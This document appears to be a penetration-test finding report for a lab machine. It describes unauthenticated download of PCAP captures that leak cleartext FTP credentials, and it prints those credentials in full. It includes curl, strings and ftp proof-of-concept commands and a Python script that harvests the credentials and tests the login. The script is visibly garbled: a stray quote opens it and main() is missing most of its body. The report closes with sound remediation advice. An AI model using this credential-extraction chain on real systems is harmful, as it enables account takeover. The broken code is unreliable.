# Cleartext Credentials Exposure in Downloadable PCAP Files

**ID:** vuln-0001
**Severity:** CRITICAL
**Found:** 2026-02-22 15:16:23 UTC
**Target:** 10.129.2.140
**Endpoint:** /download/{id}
**Method:** GET
**CWE:** CWE-312
**CVSS:** 9.1

## Description

A critical information disclosure vulnerability exists in the Security Dashboard application at http://10.129.2.140. The application captures network traffic and stores it as PCAP files that can be downloaded without authentication via the `/download/{id}` endpoint.

Analysis of the captured PCAP files reveals FTP authentication credentials transmitted in cleartext:
- Username: nathan
- Password: Buck3tH4TF0RM3!

These credentials allow unauthorized access to the FTP server running on port 21, exposing sensitive user data including flags/credentials stored on the system.

## Impact

Successful exploitation allows complete compromise of the FTP service:
- Unauthorized access to user accounts via FTP
- Retrieval of sensitive files (user flags, configuration data)
- Potential for lateral movement if credentials are reused across services
- Complete exposure of all files accessible to the compromised user account

## Technical Analysis

The vulnerability stems from multiple security failures:

1. **Unauthenticated Access to Capture Files**: The `/download/{id}` endpoint serves PCAP files without requiring authentication. IDs 0, 1, and 2 contain network traffic captures.

2. **Credential Exposure in Network Captures**: The PCAP files contain complete FTP authentication sessions including:
   - FTP banner (vsFTPd 3.0.3)
   - USER command with username
   - PASS command with cleartext password
   - Complete session interaction

3. **FTP Cleartext Authentication**: The FTP service transmits credentials without encryption, allowing anyone with network capture capabilities to intercept them.

The attack chain is:
1. Download PCAP files from `/download/0`, `/download/1`, `/download/2` (no authentication)
2. Extract strings or analyze PCAP to find FTP credentials
3. Use credentials to authenticate to FTP service
4. Access all files readable by the compromised user

## Proof of Concept

1. Download the PCAP files without authentication:
   ```
   curl -O http://10.129.2.140/download/0
   curl -O http://10.129.2.140/download/2
   ```

2. Extract credentials from the PCAP file:
   ```
   strings capture_2.pcap | grep -i pass
   ```
   Output: `PASS Buck3tH4TF0RM3!`

3. Authenticate to FTP service:
   ```
   ftp 10.129.2.140
   Username: nathan
   Password: Buck3tH4TF0RM3!
   ```

4. Retrieve sensitive files:
   ```
   ftp> get user.txt
   ```

"""

Demonstrates extraction of cleartext credentials from downloadable PCAP files

import socket
import re
import sys

def download_pcap(host, id_num):
    """Download PCAP file from target"""
    url = f"http://{host}/download/{id_num}"
    import requests
    resp = requests.get(url, timeout=10)
    if resp.status_code == 200:
        return resp.content
    return None

def extract_ftp_creds(pcap_data):
    """Extract FTP credentials from PCAP bytes"""
    data = pcap_data.decode('latin-1', errors='ignore')
    
    # Find USER command
    user_match = re.search(r'USER\s+(\w+)', data)
    # Find PASS command  
    pass_match = re.search(r'PASS\s+(\S+)', data)
    
    if user_match and pass_match:
        return user_match.group(1), pass_match.group(1)
    return None, None

def ftp_login(host, username, password):
    """Login to FTP service"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((host, 21))
    s.recv(1024)  # Banner
    
    s.send(f"USER {username}\r\n".encode())
    s.recv(1024)
    s.send(f"PASS {password}\r\n".encode())
    resp = s.recv(1024).decode()
    
    success = "230" in resp
    s.send(b"QUIT\r\n")
    s.close()
    return success

def main():

            print(f"    Username: {user}")
            print(f"    Password: {passwd}")
            
            print(f"[*] Testing FTP login...")
            if ftp_login(target, user, passwd):
                print("[+] FTP authentication successful!")
                print(f"\n[+] Impact: Complete FTP account compromise")
            break
    
    return 0

if __name__ == "__main__":
    sys.exit(main())

## Remediation

1. **Implement Authentication**: Require authentication for all `/download/{id}` and `/data/{id}` endpoints. Only allow users to access their own capture files.

2. **Sanitize PCAP Files**: Before making capture files available for download, sanitize them to remove sensitive data such as:
   - Authentication credentials (FTP, HTTP Basic Auth, Telnet)
   - Session tokens and cookies
   - Personal identifiable information

3. **Encrypt Sensitive Protocols**: Replace FTP with FTPS or SFTP to prevent credential transmission in cleartext.

4. **Access Controls**: Implement proper authorization checks to ensure users can only access their own data.

5. **Audit Logging**: Log all access to capture files for security monitoring.
